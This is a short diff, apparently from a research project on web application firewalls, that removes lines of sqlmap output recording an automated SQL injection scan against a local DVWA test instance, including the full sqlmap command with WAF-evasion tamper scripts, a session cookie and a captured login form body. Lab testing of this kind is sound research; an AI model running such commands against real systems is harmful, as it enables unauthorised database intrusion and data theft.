@@ -1,3 +1,0 @@
-http://localhost:8090/login.php (POST)  # /usr/bin/sqlmap -u http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit --level 5 --risk 3 --timeout 20 --retries 2 --batch --output-dir /home/morteza/Desktop/PHD/wafa/code/results/live/sqlmap_dvwa_sqli --forms --crawl 1 --cookie "PHPSESSID=7658281e21cc2ee5b40a7b6420fb351b; security=low" --technique BEUSTQ --tamper space2comment,charencode --threads 3 --dbms=mysql
-
-username=Hspx&password=ihCO&Login=Login&user_token=07804221c6acac417dac52d4118c00c9
